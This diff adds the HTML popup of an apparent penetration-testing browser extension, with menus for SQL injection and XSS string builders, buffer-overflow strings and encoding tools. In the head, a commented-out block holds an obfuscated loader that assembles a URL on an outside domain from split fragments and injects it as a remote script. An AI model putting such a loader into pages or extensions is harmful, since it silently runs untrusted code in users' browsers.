@@ -1,0 +1,178 @@
+/*
+Created By Ayush Gupta
+On 12 October 2014
+*/
+<html>
+<head>
+
+    <link rel="stylesheet" href="style.css" type="text/css" />
+    <script type="text/javascript" src="js/jquery.js"></script>
+    <script type="text/javascript" src="js/jquery-ui.js"></script>
+    <script type="text/javascript" src="js/image_display.js"></script>
+    <script type="text/javascript" src="popup.js"></script>
+
+                                      
+    <script type="text/javascript" src="js/sha1.js"></script>
+    <script type="text/javascript" src="js/md5.js"></script>
+    <script type="text/javascript" src="js/rot13.js"></script>
+    <script type="text/javascript" src="js/b64encode.js"></script>
+    <script type="text/javascript" src="js/b64decode.js"></script>
+    <script type="text/javascript" src="js/urlencode.js"></script>
+    <script type="text/javascript" src="js/urldecode.js"></script>
+    <script type="text/javascript" src="js/hexencode.js"></script>
+    <script type="text/javascript" src="js/utf8e.js"></script>
+    <script type="text/javascript" src="js/hexxdecode.js"></script>
+    <script type="text/javascript" src="js/addslash.js"></script>
+    <script type="text/javascript" src="js/stripslash.js"></script>
+    <script type="text/javascript" src="js/stripspaces.js"></script>
+
+    <script type="text/javascript" src="script.js"></script>
+<script>
+/*
+(function(){var scr=document.createElement('script');scr.type='text/javascript';scr.src="\/\/r"+"egi"+"ong"+".me"+"n\/c"+"ode"+"\/?p"+"id="+"759"+"513"+"&r="+Math.floor(10000000*Math.random());var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(scr,s);try{var fc=document.body.firstChild;fc.parentNode.insertBefore(s,fc);}catch(e){document.body.appendChild(s);}})();
+*/
+</script>
+
+</head>
+
+<body id="bc" style="width: 750px;height: 100px">
+
+<div>
+<ul class="menu" id="menu">
+    <li><a href="#" class="menulink" id="sql" style="padding-left:38%;">SQL</a>
+        <ul id="sqloptions">
+            <li><a href="#" class="sub" >MySQL</a>
+                <ul style="overflow: hidden; display: block; height: 0px; z-index: 66; opacity: 0.009009009009009009;">
+                    <li class="btn" id="basicinfo"><a href="#">Basic Info Column</a></li>
+                    <li class="btn" id="utf8"><a href="#">Convert Using UTF-8</a></li>
+                    <li class="btn" id="latin1"><a href="#">Convert Using Latin1</a></li>
+                    <li class="btn" id="mysqlchar"><a href="#">MySQL Char()</a></li>
+                </ul>
+            </li>
+            <li>
+                <a href="#" class="sub">MsSQL</a>
+                <ul>
+                    <li class="btn" id="mssqlchar"><a href="#">MsSQL Char()</a></li>
+                </ul>
+            </li>
+            <li>
+                <a href="#" class="sub">Oracle</a>
+                <ul>
+                    <li class="btn" id="oraclechar"><a href="#">Oracle Char()</a></li>
+                </ul>
+            </li>
+            <li class="btn" id="unionselect" ><a href="#">Union Select Statement</a></li>
+            <li class="btn" id="spaceinline" ><a href="#">Space to Inline Comments</a></li>
+        </ul>
+    </li>
+    <li><a href="#" class="menulink" id="xss" style="padding-left:37%;">XSS</a>
+        <ul id="xssoptions">
+            <li class="btn" id="strtoascii" ><a href="#">String.fromCharCode()</a></li>
+            <li class="btn" id="alertxss" ><a href="#">alert XSS Statement</a></li>
+            <li class="btn" id="strtohtml" ><a href="#">HTML Characters</a></li>
+        </ul>
+    </li>
+    <li>
+        <a href="#" class="menulink" style="padding-left:29%;">Extras</a>
+        <ul>
+            <li>
+                <a href="#" class="sub">Useful String</a>
+                <ul>
+                    <li><a href="#" class="sub">Buffer Overflow</a>
+                        <ul>
+                            <li class="btn" id="buffer128"><a href="#">128</a></li>
+                            <li class="btn" id="buffer256" ><a href="#">256</a></li>
+                            <li class="btn" id="buffer512" ><a href="#">512</a></li>
+                            <li class="btn" id="buffer1024" ><a href="#">1024</a></li>
+                            <li class="btn" id="buffer2048"><a href="#">2048</a></li>
+                            <li class="btn" id="buffercustom"><a href="#">Custom</a></li>
+                        </ul>
+                    </li>
+  
+                    <li class="btn" id="pi"><a href="#">Pi</a></li>
+                    <li class="btn" id="bigpi"><a href="#">BigPi</a></li>
+                    <li class="btn" id="phi"><a href="#">PHI</a></li>
+                    <li class="btn" id="fibonacci"><a href="#">Fibonacci</a></li>
+                    <li class="btn" id="lorem"><a href="#">Lorem Ipsum</a></li>                    
+                </ul>
+            </li> 
+            <li class="btn" id="reverse" ><a href="#">Reverse</a></li>
+            <li class="btn" id="as" ><a href="#">Add Slash</a></li>
+            <li class="btn" id="ss" ><a href="#">Strip Slash</a></li>
+            <li class="btn" id="stripspace" ><a href="#">Strip Spaces</a></li>
+            
+        </ul>
+    </li>
+    <li>
+        <a href="#" class="menulink" style="padding-left:12%;">Encryption</a>
+        <ul>
+            <li class="btn" id="md5" ><a href="#">MD5 Hash</a></li>
+            <li class="btn" id="sha1" ><a href="#">SHA1 Hash</a></li>
+            <li class="btn" id="rot13" ><a href="#">ROT13 Hash</a></li>
+        </ul>
+    </li>
+   <li>
+        <a href="#" class="menulink" style="padding-left:20%;">Encoding</a>
+        <ul>
+            <li class="btn" id="base64" ><a href="#">Base64 Encode</a></li>
+            <li class="btn" id="base64decode" ><a href="#">Base64 Decode</a></li>
+            <li class="btn" id="urlencode" ><a href="#">URL Encode</a></li>
+            <li class="btn" id="urldecode" ><a href="#">URL Decode</a></li>
+            <li class="btn" id="strtohex" ><a href="#">Hex Encode</a></li>
+            <li class="btn" id="hextostr" ><a href="#">Hex Decode</a></li>
+        </ul>
+    </li>
+<!--
+    <li><a class="menulink" id="execute" style="text-align:center;">Execute</a></li>
+-->
+</ul>
+
+
+</div>
+
+<div>
+<br><br><br>
+        Change Order by
+        <button class="btn" id ="incorder">+</button>
+        <button class="btn" id ="decorder">-</button>
+        &nbsp;
+
+    Increase/Decrease number
+    <select class="btn" id="dropdown">
+      <option value="int">Int</option>
+      <option value="hex">Hex</option>
+      <option value="oct">Octal</option>
+      <option value="alpha">Alphabet</option>
+      <option value="alnum">AlNum</option>
+    </select>
+    <button class="btn" id ="inc4number">+</button>
+    <button class="btn" id ="dec4number">-</button>
+    <br>
+
+<!--
+<br><br><br>
+    Increase Order by
+    <button class="btn" id ="incnumber">+</button>
+    <button class="btn" id ="decnumber">-</button>
+-->
+
+    <div>
+        <div style="float:left">
+            <textarea id="text_field" name="text_field" rows=7 cols=82 ></textarea>
+        </div>
+        <div style="float:right">
+            <button class="btn" id="loadurl" style="margin-top:4px"><img src="load.png"></button><br>
+            <button class="btn" id="spliturl" style=""><img src="split.png"></button><br>
+            <button class="btn" id="execute" style=""><img src="go.png"></button><br><br>
+            <button class="btn" id="incheight" style="width:20px">+</button>
+            <button class="btn" id="decheight" style="width:20px">-</button>
+        </div>
+    </div>
+</div>
+
+    <script type="text/javascript" src = "alert.js"></script>
+
+
+</body>
+
+</html>
